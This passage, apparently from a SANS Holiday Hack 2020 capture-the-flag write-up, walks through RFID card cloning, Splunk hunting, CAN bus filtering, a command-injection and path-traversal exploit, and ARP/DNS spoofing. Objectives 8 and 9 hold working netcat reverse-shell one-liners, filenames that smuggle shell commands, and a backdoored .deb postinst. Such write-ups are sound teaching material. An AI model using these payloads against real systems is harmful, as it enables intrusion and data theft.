#db# TAG ID: 2006e22f31 (6040) - Format Len: 26 bit - FC: 113 - Card: 6040 Step 2: Repeat the process near Holly Evergreen and Sparkle Redberry. [magicdust] pm3 \u2192 lf hid read #db# TAG ID: 2006e22f10 (6024) - Format Len: 26 bit - FC: 113 - Card: 6024 [magicdust] pm3 \u2192 lf hid read #db# TAG ID: 2006e22f0d (6022) - Format Len: 26 bit - FC: 113 - Card: 6022 Step 3: Stand near the HID card reader by the locked door in Santa\u2019s workshop and transmit some generated tag ID\u2019s. Simply replaying the cards that were scanned will not open the door, so you\u2019ll need to try some other nearby card numbers with the same facility code. Card #6025 opens the door. [magicdust] lf hid sim -r 2006E22F13 Tip You can use this handy calculator to generate a raw tag ID to enter into Proxmark3: http://www.ccdesignworks.com/wiegand_calc.htm","title":"Solution"},{"location":"Objectives/obj-05.html#being-santa-claus","text":"On the other side of the door is a dark room with what appears to be eyeholes on the far end. After peeping through eye holes, you find yourself on the other side of the wall but as Santa Claus! Are you Santa Claus? Are you just controlling him like a puppet? Either way, you'll find that exploring the castle as Santa opens doors to some previously unreachable experiences.","title":"Being Santa Claus"},{"location":"Objectives/obj-06.html","text":"Objective #6 - Splunk Challenge Objective Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon? Analysis Visit the Great Room and click on the Splunk terminal. You\u2019ll use the Splunk search interface to answer a series of questions from Alice Bluebird in the KringleCastle SOC. Tip Watch Dave Herrald's talk on Adversary Emulation and Automation for background on this objective. Solution Question 1. How many distinct MITRE ATT&CK techniques did Alice emulate? 13 - Search Splunk \u201c| tstats count where index=* by index\u201d. Only count the distinct tXXXX numbers, ignoring -main and -win extensions. Alice provides a smarter way to do it after you submit your answer. Pay attention to these hints to make your searches more efficient. Question 2. What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space) t1059.003-main t1059.003-win - Search \u201c| tstats count where index=t1059.003* by index\u201d to pick out just the indexes that start with t1059.003. Question 3. One technique that Santa had us simulate deals with \u2018system information discovery\u2019. What is the full name of the registry key that is queried to determine the MachineGuid? HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography - Visit the atomic-red-team github repository and search for System Information Discovery. The first hit brings you to T1082, where you\u2019ll find the answer under Atomic Test #8 - Windows MachineGUID Discovery. Question 4. According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) 2020-11-30T17:44:15Z - Search \u201cindex=attack ostap\u201d to show all the attacks that were performed that include the keyword ostap, and then scroll all the way to the bottom to find the first instance. Question 5. One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? 3648 - frgnca authored a suite of Powershell cmdlets called AudioDeviceCmdlets. Searching for that in the atomic-red-team repo returns T1123, an audio capture attack. Search \u201cindex=t1123* EventID=1 \u201cpowershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet\u201d to bring up the related events. Question 6. Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? quser - Search the Atomic Red Team github repo for \u201cRegistry Run Keys\u201d to determine this is technique T1547.001. The batch file referenced in Atomic Test #3 is Discovery.bat, and the last line of that is \u201cquser\u201d. Question 7. According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? 55FCEEBB21270D9249E86F4B9DC7AA60 - Search for \u201cindex= sourcetype=bro \u201d in Splunk. Add certificate.subject to the selected fields, and look at the top 10 values. Add \u201cCN=win-dc-748.attackrange.local\u201d to the search criteria, and now look in any of the events to find the certificate serial number. Question 8. What is the name of the adversary group that Santa feared would attack KringleCon? (Challenge Question) The Lollipop Guild - Copy the string 7FXjP1lyfKbyDK/MChyf36h7 into CyberChef (https://gchq.github.io/CyberChef/), apply the \u201cFrom Base64\u201d filter, then apply \u201cRC4\u201d with the phrase \u201cStay Frosty\u201d, which was given in the Adversary Emulation and Automation talk. Answer: The Lollipop Guild","title":"6) Splunk Challenge"},{"location":"Objectives/obj-06.html#objective-6-splunk-challenge","text":"","title":"Objective #6 - Splunk Challenge"},{"location":"Objectives/obj-06.html#objective","text":"Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?","title":"Objective"},{"location":"Objectives/obj-06.html#analysis","text":"Visit the Great Room and click on the Splunk terminal. You\u2019ll use the Splunk search interface to answer a series of questions from Alice Bluebird in the KringleCastle SOC. Tip Watch Dave Herrald's talk on Adversary Emulation and Automation for background on this objective.","title":"Analysis"},{"location":"Objectives/obj-06.html#solution","text":"Question 1. How many distinct MITRE ATT&CK techniques did Alice emulate? 13 - Search Splunk \u201c| tstats count where index=* by index\u201d. Only count the distinct tXXXX numbers, ignoring -main and -win extensions. Alice provides a smarter way to do it after you submit your answer. Pay attention to these hints to make your searches more efficient. Question 2. What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space) t1059.003-main t1059.003-win - Search \u201c| tstats count where index=t1059.003* by index\u201d to pick out just the indexes that start with t1059.003. Question 3. One technique that Santa had us simulate deals with \u2018system information discovery\u2019. What is the full name of the registry key that is queried to determine the MachineGuid? HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography - Visit the atomic-red-team github repository and search for System Information Discovery. The first hit brings you to T1082, where you\u2019ll find the answer under Atomic Test #8 - Windows MachineGUID Discovery. Question 4. According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) 2020-11-30T17:44:15Z - Search \u201cindex=attack ostap\u201d to show all the attacks that were performed that include the keyword ostap, and then scroll all the way to the bottom to find the first instance. Question 5. One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? 3648 - frgnca authored a suite of Powershell cmdlets called AudioDeviceCmdlets. Searching for that in the atomic-red-team repo returns T1123, an audio capture attack. Search \u201cindex=t1123* EventID=1 \u201cpowershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet\u201d to bring up the related events. Question 6. Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? quser - Search the Atomic Red Team github repo for \u201cRegistry Run Keys\u201d to determine this is technique T1547.001. The batch file referenced in Atomic Test #3 is Discovery.bat, and the last line of that is \u201cquser\u201d. Question 7. According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? 55FCEEBB21270D9249E86F4B9DC7AA60 - Search for \u201cindex= sourcetype=bro \u201d in Splunk. Add certificate.subject to the selected fields, and look at the top 10 values. Add \u201cCN=win-dc-748.attackrange.local\u201d to the search criteria, and now look in any of the events to find the certificate serial number. Question 8. What is the name of the adversary group that Santa feared would attack KringleCon? (Challenge Question) The Lollipop Guild - Copy the string 7FXjP1lyfKbyDK/MChyf36h7 into CyberChef (https://gchq.github.io/CyberChef/), apply the \u201cFrom Base64\u201d filter, then apply \u201cRC4\u201d with the phrase \u201cStay Frosty\u201d, which was given in the Adversary Emulation and Automation talk. Answer: The Lollipop Guild","title":"Solution"},{"location":"Objectives/obj-07.html","text":"Objective #7 - Solve the Sleigh's CAN-D-BUS Problem Objective Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints. Analysis Santa\u2019s sleigh is not running smoothly. You have access to a diagnostics terminal that allows you to monitor messages on the CAN-D bus, and some controls that allow you to start and stop the engine and inject some inputs into the system like steering and braking. Tip Not sure what a CAN bus is? Watch Chris Elgee's CAN Bus Can-Can talk to learn everything you need to know. Solution Step 1: There are initially many zero value events appearing in the terminal display. Add some filters so you can focus on more important output. ID Operator Criterion 244 Equals 000000000000 080 Equals 000000000000 019 Equals 000000000000 188 Equals 000000000000 Step 2: With all the zero value events are filtered, start applying some inputs to determine what sort of messages they generate. Function ID Values Lock 19B 000000000000 Unlock 19B 000000F00000 Steer 019 FFFF## for left and 0000## for right Brake 080 000000 to 000064 Engine RPM 244 Hex value matches decimal tachometer reading Step 3: Knowing what is normal for the sleigh, you can pick out the abnormal events like the \u201c0000000F2057\u201d message that randomly appears under the lock/unlock ID, and the intermittent brake messages that begin with FFFF. Add filters for these. ID Operator Criterion 119B Equals 0000000F2057 080 Contains FFFF Step 4: Remove the zero value filters and start the engine. Santa's Sleigh has been deFrosted","title":"7) Solve the Sleigh's CAN-D-BUS Problem"},{"location":"Objectives/obj-07.html#objective-7-solve-the-sleighs-can-d-bus-problem","text":"","title":"Objective #7 - Solve the Sleigh's CAN-D-BUS Problem"},{"location":"Objectives/obj-07.html#objective","text":"Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.","title":"Objective"},{"location":"Objectives/obj-07.html#analysis","text":"Santa\u2019s sleigh is not running smoothly. You have access to a diagnostics terminal that allows you to monitor messages on the CAN-D bus, and some controls that allow you to start and stop the engine and inject some inputs into the system like steering and braking. Tip Not sure what a CAN bus is? Watch Chris Elgee's CAN Bus Can-Can talk to learn everything you need to know.","title":"Analysis"},{"location":"Objectives/obj-07.html#solution","text":"Step 1: There are initially many zero value events appearing in the terminal display. Add some filters so you can focus on more important output. ID Operator Criterion 244 Equals 000000000000 080 Equals 000000000000 019 Equals 000000000000 188 Equals 000000000000 Step 2: With all the zero value events are filtered, start applying some inputs to determine what sort of messages they generate. Function ID Values Lock 19B 000000000000 Unlock 19B 000000F00000 Steer 019 FFFF## for left and 0000## for right Brake 080 000000 to 000064 Engine RPM 244 Hex value matches decimal tachometer reading Step 3: Knowing what is normal for the sleigh, you can pick out the abnormal events like the \u201c0000000F2057\u201d message that randomly appears under the lock/unlock ID, and the intermittent brake messages that begin with FFFF. Add filters for these. ID Operator Criterion 119B Equals 0000000F2057 080 Contains FFFF Step 4: Remove the zero value filters and start the engine. Santa's Sleigh has been deFrosted","title":"Solution"},{"location":"Objectives/obj-08.html","text":"Objective #8 - Broken Tag Generator Objective Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this. Solution Step 1: Analyze the website\u2019s functionality. When you upload an image file, the upload request returns a filename that you can then download by visiting /image?id=[filename]. Step 2: Force an error by visiting a non-existent page to see what happens. This tells you the full path on the server\u2019s file system where the application code is stored. Error message in browser when non-existent page is requested Step 3: Attempt to download the application\u2019s source code using a directory path traversal attack. This can be used to download any known file from the server. $ curl --output app.rb https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb Step 4: Analyze the source code. When a ZIP file is uploaded, the application will uncompress it to the file system, validate whether the files have a jpg, jpeg, or png extension, then resize the images to 800x600 using ImageMagick with a system call to execute \"convert\". Jack Frost commented out some important security features that would prevent someone from uploading filenames with special characters. Step 5: Create a malicious zip file, then start a netcat listener. Your goal is to exploit a specific line of code in app.rb where a system call to resize the image is made. if ! system ( \"convert -resize 800x600 \\\\ > -quality 75 ' #{ filename } ' ' #{ out_path } '\" ) One of the command line parameters is the filename, which you control. You'll delimit the command with a semicolon, which allows you to run any command of your choosing under the context of the web server. You could run something like env>environ.txt to dump the environment variables to a text file. $ touch \"f';env>foo.txt;'.png\" $ zip test.zip \"f';env>foo.txt;'.png\" adding: f';env>environ.txt;'.png (deflated 1%) Step 6: Upload the zip file to the website and then download the resulting text file by exploiting the directory traversal vulnerability again. $ curl --output - https://tag-generator.kringlecastle.com/image?id=foo.txt RUBY_MAJOR=2.7 GREETZ=JackFrostWasHere <...output omitted...> \ud83d\ude23 I pulled a lot of hairs over this remote code execution. It wasn't until I installed ImageMagick and tested the script locally that I realized I had to close a single quotation mark. Thank you @john_r2 for pulling me out of that rabbit hole so I could carry this one over the finish line! Alternate Solution You can solve this objective with a single command. Since environment variables can be accessed through the proc file system, you can use curl to fetch the file /proc/self/environ to see the web server process's environment variables. $ curl --output - https://tag-generator.kringlecastle.com/image?id=../proc/self/environ PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=3acd3f464d04RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app Getting Reverse Shell It's also possible to get a remote shell on this system using the same technique. Step 1: Create a malicious zip file and set up a netcat listener. $ touch \"f'rm f;mkfifo f;cat f|sh -i 2>&1|nc 12.34.56.78 5555 >f;'.png\" $ zip exploit.zip \"f'rm f;mkfifo f;cat f|sh -i 2>&1|nc 12.34.56.78 5555 >f;'.png\" Step 2: Set up a netcat listener on your host and upload the zip file to the website. $ netcat -vnlp 5555 Listening on 0.0.0.0 5555 Connection received on 35.232.236.115 39988 id uid=1000(app) gid=1000(app) groups=1000(app) env | grep GREETZ GREETZ=JackFrostWasHere Answer: JackFrostWasHere","title":"8) Broken Tag Generator"},{"location":"Objectives/obj-08.html#objective-8-broken-tag-generator","text":"","title":"Objective #8 - Broken Tag Generator"},{"location":"Objectives/obj-08.html#objective","text":"Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.","title":"Objective"},{"location":"Objectives/obj-08.html#solution","text":"Step 1: Analyze the website\u2019s functionality. When you upload an image file, the upload request returns a filename that you can then download by visiting /image?id=[filename]. Step 2: Force an error by visiting a non-existent page to see what happens. This tells you the full path on the server\u2019s file system where the application code is stored. Error message in browser when non-existent page is requested Step 3: Attempt to download the application\u2019s source code using a directory path traversal attack. This can be used to download any known file from the server. $ curl --output app.rb https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb Step 4: Analyze the source code. When a ZIP file is uploaded, the application will uncompress it to the file system, validate whether the files have a jpg, jpeg, or png extension, then resize the images to 800x600 using ImageMagick with a system call to execute \"convert\". Jack Frost commented out some important security features that would prevent someone from uploading filenames with special characters. Step 5: Create a malicious zip file, then start a netcat listener. Your goal is to exploit a specific line of code in app.rb where a system call to resize the image is made. if ! system ( \"convert -resize 800x600 \\\\ > -quality 75 ' #{ filename } ' ' #{ out_path } '\" ) One of the command line parameters is the filename, which you control. You'll delimit the command with a semicolon, which allows you to run any command of your choosing under the context of the web server. You could run something like env>environ.txt to dump the environment variables to a text file. $ touch \"f';env>foo.txt;'.png\" $ zip test.zip \"f';env>foo.txt;'.png\" adding: f';env>environ.txt;'.png (deflated 1%) Step 6: Upload the zip file to the website and then download the resulting text file by exploiting the directory traversal vulnerability again. $ curl --output - https://tag-generator.kringlecastle.com/image?id=foo.txt RUBY_MAJOR=2.7 GREETZ=JackFrostWasHere <...output omitted...> \ud83d\ude23 I pulled a lot of hairs over this remote code execution. It wasn't until I installed ImageMagick and tested the script locally that I realized I had to close a single quotation mark. Thank you @john_r2 for pulling me out of that rabbit hole so I could carry this one over the finish line!","title":"Solution"},{"location":"Objectives/obj-08.html#alternate-solution","text":"You can solve this objective with a single command. Since environment variables can be accessed through the proc file system, you can use curl to fetch the file /proc/self/environ to see the web server process's environment variables. $ curl --output - https://tag-generator.kringlecastle.com/image?id=../proc/self/environ PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=3acd3f464d04RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app","title":"Alternate Solution"},{"location":"Objectives/obj-08.html#getting-reverse-shell","text":"It's also possible to get a remote shell on this system using the same technique. Step 1: Create a malicious zip file and set up a netcat listener. $ touch \"f'rm f;mkfifo f;cat f|sh -i 2>&1|nc 12.34.56.78 5555 >f;'.png\" $ zip exploit.zip \"f'rm f;mkfifo f;cat f|sh -i 2>&1|nc 12.34.56.78 5555 >f;'.png\" Step 2: Set up a netcat listener on your host and upload the zip file to the website. $ netcat -vnlp 5555 Listening on 0.0.0.0 5555 Connection received on 35.232.236.115 39988 id uid=1000(app) gid=1000(app) groups=1000(app) env | grep GREETZ GREETZ=JackFrostWasHere Answer: JackFrostWasHere","title":"Getting Reverse Shell"},{"location":"Objectives/obj-09.html","text":"Objective #9 - ARP Shenanigans Objective Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document? Tip If you need help, read the HELP.md file in the terminal for additional hints. Solution Step 1: Capture some packets and notice that there are unanswered ARP requests coming from the remote host. $ tshark -ni eth0 Capturing on 'eth0' 1 0.000000000 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 Step 2: Modify arp_rest.py to create a spoofed reply to the ARP request. The following lines need to be modified in the script. ether_resp = Ether(dst=\"4c:24:57:ab:ed:84\", type=0x806, src=\"02:42:0a:06:00:02\") arp_response = ARP(pdst=\"4c:24:57:ab:ed:84\") arp_response.op = 2 arp_response.plen = 4 arp_response.hwlen = 6 arp_response.ptype = 0x0800 arp_response.hwtype = 1 arp_response.hwsrc = \"02:42:0a:06:00:02\" arp_response.psrc = \"10.6.6.53\" arp_response.hwdst = \"4c:24:57:ab:ed:84\" arp_response.pdst = \"10.6.6.35\" Note Your terminal may use slightly different values for IP address and MAC address. Be sure to check the output of ifconfig to see what values to use for the local host. Step 3: Observe the DNS request once the ARP reply is correct. $ tshark -ni eth0 Capturing on 'eth0' 9 8.295979549 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 10 8.320179378 02:42:0a:06:00:03 \u2192 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03 11 8.336321657 10.6.6.35 \u2192 10.6.6.53 DNS 74 Standard query 0x0000 A ftp.osuosl.org Step 4: Modify dns_resp.py to create a spoofed reply to the DNS request. The following lines need to be modified in the script. When you run this, you\u2019ll see in the tshark output that a request is being made to port 80 on your host. ipaddr_we_arp_spoofed = \"10.6.6.53\" def handle_dns_request(packet): eth = Ether(src=\"02:42:0a:06:00:02\", dst=\"4c:24:57:ab:ed:84\") ip = IP(dst=\"10.6.6.35\", src=\"10.6.6.53\") udp = UDP(dport=packet[UDP].sport, sport=53) dns = DNS( id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=ipaddr) Step 5: Set up an http listener to answer the port 80 connection. You'll see that the client is requesting a .deb file. $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) \u2026 10.6.6.35 - - [14/Dec/2020 03:14:41] code 404, message File not found 10.6.6.35 - - [14/Dec/2020 03:14:41] \"GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1\" 404 - Step 6: Create a deb file to exploit the remote host. A .deb file is a debian software package. A post-installation script can be embedded in the file to run commands necessary to complete the package setup. You'll find a netcat deb package in the debs folder on the terminal. You can rename this to the deb package being requested by the remote host, and modify it to run a netcat command after it is installed. fakeroot sh -c ' mkdir tmp dpkg-deb -R debs/netcat-traditional_1.10\u201341.1ubuntu1_amd64.deb tmp echo \"nc -e /bin/sh 10.6.0.2 5678\" >> tmp/DEBIAN/postinst dpkg-deb -b tmp fixed.deb ' Info fakeroot runs a command in an environment where it appears to have root privileges for file manipulation. This is useful for allowing users to create archives (tar, ar, .deb etc.) with files in them with root permissions/ownership. -From https://wiki.debian.org/FakeRoot Step 7 : Put it all together Tmux pane #1 contains the DNS spoof responder and the HTTP listener. $ mkdir -p http/pub/jfrost/backdoor $ mv fixed.deb http/pub/jfrost/backdoor/suriv_amd64.deb $ scripts/dns_resp.py && python3 -m http.server 80 --directory http/ TMUX pane #3 contains the netcat listener to catch the reverse shell. $ nc -nlvp 5678 Tmux pane #2 contains the ARP spoof responder. $ scripts/arp_resp.py Step 8: When the reverse shell is established, view the target file. $ nc -nlvp 5678 listening on [any] 5678 connect to [10.6.0.2] from (UNKNOWN) [10.6.6.35] 35976 id uid=1500(jfrost) gid=1500(jfrost) groups=1500(jfrost) cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt NORTH POLE LAND USE BOARD MEETING MINUTES January 20, 2020 Meeting Location: All gathered in North Pole Municipal Building, 1 Santa Claus Ln, North Pole Chairman Frost calls meeting to order at 7:30 PM North Pole Standard Time. Roll call of Board members please: Chairman Jack Frost - Present Vice Chairman Mother Nature - Present Superman - Present Clarice - Present Yukon Cornelius - HERE! Ginger Breaddie - Present King Moonracer - Present Mrs. Donner - Present Tanta Kringle - Present Charlie In-the-Box - Here Krampus - Growl Dolly - Present Snow Miser - Heya! Alabaster Snowball - Hello Queen of the Winter Spirits - Present ALSO PRESENT: Kris Kringle Pepper Minstix Heat Miser Father Time Chairman Frost made the required announcement concerning the Open Public Meetings Act: Adequate notice of this meeting has been made -- displayed on the bulletin board next to the Pole, listed on the North Pole community website, and published in the North Pole Times newspaper -- for people who are interested in this meeting. Review minutes for December 2020 meeting. Motion to accept \u2013 Mrs. Donner. Second \u2013 Superman. Minutes approved. OLD BUSINESS: No Old Business. RESOLUTIONS: The board took up final discussions of the plans presented last year for the expansion of Santa\u2019s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle. Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, \u201cThese changes will put a heavy toll on the infrastructure of the North Pole.\u201d Mr. Krampus replied, \u201cThe infrastructure has already been expanded to handle it quite easily.\u201d Chairman Frost then noted, \u201cBut the additional traffic will be a burden on local residents.\u201d Dolly explained traffic projections were all in alignment with existing roadways. Chairman Frost then exclaimed, \u201cBut with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as \u2018The Frostiest Place on Earth?\u2019\u201d Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board. Mrs. Nature made a motion to approve. Seconded by Mr. Cornelius. Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life. Approved: Mother Nature Superman Clarice Yukon Cornelius Ginger Breaddie King Moonracer Mrs. Donner Charlie In the Box Krampus Dolly Snow Miser Alabaster Snowball Queen of the Winter Spirits Opposed: Jack Frost Resolution carries. Construction approved. NEW BUSINESS: Father Time Castle, new oversized furnace to be installed by Heat Miser Furnace, Inc. Mr. H. Miser described the plan for installing new furnace to replace the faltering one in Mr. Time\u2019s 20,000 sq ft castle. Ms. G. Breaddie pointed out that the proposed new furnace is 900,000,000 BTUs, a figure she considers \u201cincredibly high for a building that size, likely two orders of magnitude too high. Why, it might burn the whole North Pole down!\u201d Mr. H. Miser replied with a laugh, \u201cThat\u2019s the whole point!\u201d The board voted unanimously to reject the initial proposal, recommending that Mr. Miser devise a more realistic and safe plan for Mr. Time\u2019s castle heating system. Motion to adjourn \u2013 So moved, Krampus. Second \u2013 Clarice. All in favor \u2013 aye. None opposed, although Chairman Frost made another note of his strong disagreement with the approval of the Kringle Castle expansion plan. Meeting adjourned. Answer: Tanta Kringle","title":"9) ARP Shenanigans"},{"location":"Objectives/obj-09.html#objective-9-arp-shenanigans","text":"","title":"Objective #9 - ARP Shenanigans"},{"location":"Objectives/obj-09.html#objective","text":"Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document? Tip If you need help, read the HELP.md file in the terminal for additional hints.","title":"Objective"},{"location":"Objectives/obj-09.html#solution","text":"Step 1: Capture some packets and notice that there are unanswered ARP requests coming from the remote host. $ tshark -ni eth0 Capturing on 'eth0' 1 0.000000000 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 Step 2: Modify arp_rest.py to create a spoofed reply to the ARP request. The following lines need to be modified in the script. ether_resp = Ether(dst=\"4c:24:57:ab:ed:84\", type=0x806, src=\"02:42:0a:06:00:02\") arp_response = ARP(pdst=\"4c:24:57:ab:ed:84\") arp_response.op = 2 arp_response.plen = 4 arp_response.hwlen = 6 arp_response.ptype = 0x0800 arp_response.hwtype = 1 arp_response.hwsrc = \"02:42:0a:06:00:02\" arp_response.psrc = \"10.6.6.53\" arp_response.hwdst = \"4c:24:57:ab:ed:84\" arp_response.pdst = \"10.6.6.35\" Note Your terminal may use slightly different values for IP address and MAC address. Be sure to check the output of ifconfig to see what values to use for the local host. Step 3: Observe the DNS request once the ARP reply is correct. $ tshark -ni eth0 Capturing on 'eth0' 9 8.295979549 4c:24:57:ab:ed:84 \u2192 ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35 10 8.320179378 02:42:0a:06:00:03 \u2192 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03 11 8.336321657 10.6.6.35 \u2192 10.6.6.53 DNS 74 Standard query 0x0000 A ftp.osuosl.org Step 4: Modify dns_resp.py to create a spoofed reply to the DNS request. The following lines need to be modified in the script. When you run this, you\u2019ll see in the tshark output that a request is being made to port 80 on your host. ipaddr_we_arp_spoofed = \"10.6.6.53\" def handle_dns_request(packet): eth = Ether(src=\"02:42:0a:06:00:02\", dst=\"4c:24:57:ab:ed:84\") ip = IP(dst=\"10.6.6.35\", src=\"10.6.6.53\") udp = UDP(dport=packet[UDP].sport, sport=53) dns = DNS( id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=ipaddr) Step 5: Set up an http listener to answer the port 80 connection. You'll see that the client is requesting a .deb file. $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) \u2026 10.6.6.35 - - [14/Dec/2020 03:14:41] code 404, message File not found 10.6.6.35 - - [14/Dec/2020 03:14:41] \"GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1\" 404 - Step 6: Create a deb file to exploit the remote host. A .deb file is a debian software package. A post-installation script can be embedded in the file to run commands necessary to complete the package setup. You'll find a netcat deb package in the debs folder on the terminal. You can rename this to the deb package being requested by the remote host, and modify it to run a netcat command after it is installed. fakeroot sh -c ' mkdir tmp dpkg-deb -R debs/netcat-traditional_1.10\u201341.1ubuntu1_amd64.deb tmp echo \"nc -e /bin/sh 10.6.0.2 5678\" >> tmp/DEBIAN/postinst dpkg-deb -b tmp fixed.deb ' Info fakeroot runs a command in an environment where it appears to have root privileges for file manipulation. This is useful for allowing users to create archives (tar, ar, .deb etc.) with files in them with root permissions/ownership. -From https://wiki.debian.org/FakeRoot Step 7 : Put it all together Tmux pane #1 contains the DNS spoof responder and the HTTP listener. $ mkdir -p http/pub/jfrost/backdoor $ mv fixed.deb http/pub/jfrost/backdoor/suriv_amd64.deb $ scripts/dns_resp.py && python3 -m http.server 80 --directory http/ TMUX pane #3 contains the netcat listener to catch the reverse shell. $ nc -nlvp 5678 Tmux pane #2 contains the ARP spoof responder. $ scripts/arp_resp.py Step 8: When the reverse shell is established, view the target file. $ nc -nlvp 5678 listening on [any] 5678 connect to [10.6.0.2] from (UNKNOWN) [10.6.6.35] 35976 id uid=1500(jfrost) gid=1500(jfrost) groups=1500(jfrost) cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt NORTH POLE LAND USE BOARD MEETING MINUTES January 20, 2020 Meeting Location: All gathered in North Pole Municipal Building, 1 Santa Claus Ln, North Pole Chairman Frost calls meeting to order at 7:30 PM North Pole Standard Time. Roll call of Board members please: Chairman Jack Frost - Present Vice Chairman Mother Nature - Present Superman - Present Clarice - Present Yukon Cornelius - HERE! Ginger Breaddie - Present King Moonracer - Present Mrs. Donner - Present Tanta Kringle - Present Charlie In-the-Box - Here Krampus - Growl Dolly - Present Snow Miser - Heya! Alabaster Snowball - Hello Queen of the Winter Spirits - Present ALSO PRESENT: Kris Kringle Pepper Minstix Heat Miser Father Time Chairman Frost made the required announcement concerning the Open Public Meetings Act: Adequate notice of this meeting has been made -- displayed on the bulletin board next to the Pole, listed on the North Pole community website, and published in the North Pole Times newspaper -- for people who are interested in this meeting. Review minutes for December 2020 meeting. Motion to accept \u2013 Mrs. Donner. Second \u2013 Superman. Minutes approved. OLD BUSINESS: No Old Business. RESOLUTIONS: The board took up final discussions of the plans presented last year for the expansion of Santa\u2019s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle. Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, \u201cThese changes will put a heavy toll on the infrastructure of the North Pole.\u201d Mr. Krampus replied, \u201cThe infrastructure has already been expanded to handle it quite easily.\u201d Chairman Frost then noted, \u201cBut the additional traffic will be a burden on local residents.\u201d Dolly explained traffic projections were all in alignment with existing roadways. Chairman Frost then exclaimed, \u201cBut with all the attention focused on Santa and his castle, 